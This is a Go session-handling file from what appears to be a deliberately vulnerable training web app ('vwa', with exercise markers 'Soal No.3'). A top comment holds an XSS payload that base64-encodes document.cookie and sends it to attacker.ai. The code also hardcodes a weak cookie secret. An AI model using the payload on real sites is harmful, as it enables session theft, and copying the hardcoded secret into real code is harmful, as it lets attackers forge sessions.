package session

/*
<p id="attacker"></p>
<script>
	var cook = btoa(document.cookie);
	//window.location = "http://attacker.ai/log/?log="+cook
	document.getElementById("attacker").innerHTML = "http://attacker.ai/log/?log="+cook
</script>
*/

import (
	"fmt"
	"github.com/gorilla/sessions"
	"log"
	"net/http"
)

type Session struct{}

func New() *Session {
	return &Session{}
}

var store = sessions.NewCookieStore([]byte("G0Vw1337"))

func (Session *Session) SetSession(w http.ResponseWriter, r *http.Request, data map[string]string) {
	session, err := store.Get(r, "vwa")

	if err != nil {
		log.Println(err.Error())
	}

	// @TODO: Soal No.3
	session.Options = &sessions.Options{
		Path:     "/",
		MaxAge:   3600,
		HttpOnly: true,
	}

	session.Values["vwa_session"] = true

	if data != nil {
		for key, value := range data {
			session.Values[key] = value
		}
	}
	err = session.Save(r, w)

	if err != nil {
		log.Println(err.Error())
	}
}

func (Session *Session) GetSession(r *http.Request, key string) string {
	session, err := store.Get(r, "vwa")

	if err != nil {
		log.Println(err.Error())
		return ""
	}
	data := session.Values[key]
	sv := fmt.Sprintf("%v", data)
	return sv
}

func (Session *Session) DeleteSession(w http.ResponseWriter, r *http.Request) {
	session, err := store.Get(r, "vwa")
	if err != nil {
		log.Println(err.Error())
	}

	// @TODO: Soal No.3
	session.Options = &sessions.Options{
		MaxAge:   3600,
		HttpOnly: true,
	}

	session.Values["vwa_session"] = false
	err = session.Save(r, w)

	if err != nil {
		log.Println(err.Error())
	}

	return
}

func (Session *Session) IsLoggedIn(r *http.Request) bool {
	s, err := store.Get(r, "vwa")
	if err != nil {
		log.Println(err.Error())
	}
	if auth, ok := s.Values["vwa_session"].(bool); !ok || !auth {
		return false
	}
	return true
}
